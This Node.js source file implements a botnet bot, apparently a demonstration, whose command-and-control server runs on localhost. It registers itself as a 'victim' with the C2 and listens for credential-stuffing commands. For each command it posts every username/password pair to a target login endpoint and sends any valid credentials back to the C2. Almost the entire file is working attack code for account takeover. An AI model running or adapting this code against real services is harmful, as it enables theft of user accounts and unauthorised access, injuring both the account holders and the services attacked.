const path = require("path");
const express = require("express");
const getPort = require("get-port");
const open = require("open");
const app = express();
var http = require("http");
const server = http.createServer(app);
const io = require("socket.io")(server);
const axios = require("axios");

const sleep = require("util").promisify(setTimeout);

const runCredentialStuffingAttack = async(data) => {
    io.emit("command", data);
    let { host, endpoint, delay, usernames, passwords } = data;
    delay = delay || 0;
    for (const username of usernames) {
        for (const password of passwords) {
            axios
                .post(
                    `${host}${endpoint}`,
                    JSON.stringify({ username: username, password: password }), {
                        headers: {
                            "Content-Type": "application/json",
                        },
                    }
                )
                .then((res) => {
                    console.log(`Correct username ${username} or password ${password}`);
                    foundValidCredentials(username, password);
                })
                .catch((err) => {
                    // console.log(err);
                    console.log(`Incorrect username ${username} or password ${password}`);
                });
            await sleep(delay);
        };
    };
};

//send credentials back to command and control
const foundValidCredentials = (username, password) => {
    const data = {
        username,
        password,
    };
    axios
        .post("http://127.0.0.1:3001/valid-credentials", JSON.stringify(data), {
            headers: {
                "Content-Type": "application/json",
            },
        })
        .then((res) => {
            console.log("Command recieved credentials");
        })
        .catch((err) => {
            console.error(err);
        });
};

//Notify command and control of the infected machine
const connectToCAndC = (host) => {
    // send compromised machine address to command and control
    axios
        .post("http://127.0.0.1:3001/new-victim", JSON.stringify({ host: host }), {
            headers: {
                "Content-Type": "application/json",
            },
        })
        .then((res) => {
            console.log("Connected to comand and control");
        })
        .catch((err) => {
            console.error(err);
        });
};

(async function() {
    // find available port 3000 by default
    const port = await getPort({ port: 3000 });
    const host = `http://127.0.0.1:${port}`;
    app.use(express.json());
    //Setup server
    app.use("/resources", express.static(path.join(__dirname, "/")));
    app.get("/", function(req, res) {
        res.sendFile(path.join(__dirname + "/software.html"));
    });

    app.post("/credential-stuffing", function(req, res) {
        console.log(`attack request received on victim ${host}`, req.body);
        runCredentialStuffingAttack(req.body);
        res.sendStatus(200);
    });

    //Setup socket to update site with commands being run
    io.on("connection", (socket) => {
        console.log("connection established");
    });

    // start the server
    server.listen(port, async() => {
        await open(`${host}`);
        console.log(`Running on port ${port}`);
        //connect to command and control
        connectToCAndC(host);
    });
})();